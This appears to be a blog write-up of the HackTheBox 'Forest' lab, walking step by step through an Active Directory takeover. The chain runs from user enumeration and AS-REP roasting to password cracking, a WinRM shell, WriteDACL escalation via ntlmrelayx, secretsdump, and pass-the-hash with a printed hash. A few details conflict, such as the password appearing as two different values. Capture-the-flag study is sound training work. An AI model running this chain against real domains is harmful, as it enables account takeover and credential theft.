---
title: "Forest (HackTheBox)"
date: 2020-01-22T14:55:09-05:00
draft: false
description: "Leveraging WriteDACL to Gain Domain Administrator Privileges in Active Directory"
---

Leveraging WriteDACL to Gain Domain Administrator Privileges in Active Directory  

# Host Information  

IP: 10.10.10.161  
Difficulty: easy  

# Service Enumeration  

```bash
enum4linux -a 10.10.10.161  | tee enum4linux-output
```  

>[+] Getting domain group memberships:
Group 'Domain Controllers' (RID: 516) has member: HTB\FOREST$
Group 'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
Group 'Group Policy Creator Owners' (RID: 520) has member: HTB\Administrator
Group 'Domain Users' (RID: 513) has member: HTB\Administrator
Group 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
Group 'Domain Users' (RID: 513) has member: HTB\krbtgt
Group 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
Group 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
Group 'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
Group 'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
Group 'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
Group 'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
Group 'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
Group 'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
Group 'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
Group 'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
Group 'Domain Users' (RID: 513) has member: HTB\sebastien  
Group 'Domain Users' (RID: 513) has member: HTB\lucinda  
Group 'Domain Users' (RID: 513) has member: HTB\svc-alfresco  
Group 'Domain Users' (RID: 513) has member: HTB\andy  
Group 'Domain Users' (RID: 513) has member: HTB\mark  
Group 'Domain Users' (RID: 513) has member: HTB\santi  
Group 'Domain Admins' (RID: 512) has member: HTB\Administrator  
Group 'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$  
Group 'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7  
Group 'Domain Computers' (RID: 515) has member: HTB\EXCH01$  
Group 'Domain Guests' (RID: 514) has member: HTB\Guest  
Group 'Schema Admins' (RID: 518) has member: HTB\Administrator  
Group 'Managed Availability Servers' (RID: 1120) has member: HTB\EXCH01$  
Group 'Managed Availability Servers' (RID: 1120) has member: HTB\Exchange Servers  
Group '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$  
Group 'Exchange Windows Permissions' (RID: 1121) has member: HTB\Exchange Trusted Subsystem  
Group 'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco  
Group 'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$  
Group 'Enterprise Admins' (RID: 519) has member: HTB\Administrator  
Group 'Organization Management' (RID: 1104) has member: HTB\Administrator  

If we used tee in the above command and saved the output in **enum4linux-output** we can get a list of the domain users:  

```bash
cat enum4linux-output | grep "Domain Users" | cut -d "\\" -f 2 > domain-users  
```  

Great now that we have a list of domain-users we can check and see if any of them are Kerberoastable.

> Service Principal Names (SPNs) are used by Windows to identify which service account is used to encrypt a Ticket Granting Service ticket. There are host-based SPNs that are linked to computer accounts and there are Domain User linked SPNs. If an SPN is registered for a domain user account, the NT hash of a domain-joined users password will be used to encrypt the TGS. This is important because when the domain controller creates the TGS, it does not check if the requesting user is authorized to make the request.

Reference: https://www.scip.ch/en/?labs.20181011  

We can therefore pass the Domain Controller our curated list of domain users to check if any of them can request TGS for "free". Then we can try to crack their NT hash offline.  

```bash
./GetNPUsers.py htb.local/ -no-pass -usersfile /root/Desktop/htb/forest/domain-users
```

Boom! Impacket dumps the hash of the svc-alfresco service account. Save the password hash in a text file by itself and we can crack it with John.  

```bash
john alfreso-hash --wordlist=/usr/share/wordlists/rockyou.txt
```  

svc-alfresco:s3rvice  

We can use evil-winrm to open a command prompt on the target:  

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```  

Since this is a domain controller and we have a domain-user / service account shell, we can enumerate our domain permissions manually, or more simply using BloodHound. 

[BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)  

BloodHound is dope and immediately tells us that we have writeDACL permission. This privilege essentially means that we have the ability to modify the permissions of users in the Domain; cool, can we just elevate ourselves? YEP!  

First we move our user into the Exchange Windows Permission group, then we authentication to a local NTLMRelayx.py service that is provided with Impacket, and then ntlmrelayx.py does the heavy lifting for us.  

startup our local ntlmrelayx:  

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://htb.local --escalate-user svc-alfresco
```

In our evil-winrm shell we execute:  

> net group "Exchange Windows Permission" svc-alfresco /DOMAIN

Keep the evil-winrm shell active since the permissions reset when we relog as svc-alfresco.

We just have to provide ntlmrelayx our credentials now; the way this is done is a bit funky since we can't provide them with a command-line switch we have to hit it from our localhost via browser:    

```http://localhost/   
username: svc-alfresco
password: s3cret
```  

ntlmrelayx authenticates using the credentials we provided, it tells us to use secretsdump so lets give that a shot.  

```bash
./secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
```  

Since we can now change the ACL, ntlmrelay puts our user into the Domain Administrators group and secretsdump.py dumps hashes out of memory. Now we can pass-the-hash to authenticate in as the Administrator account and read root.txt:  

```bash
python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161
```

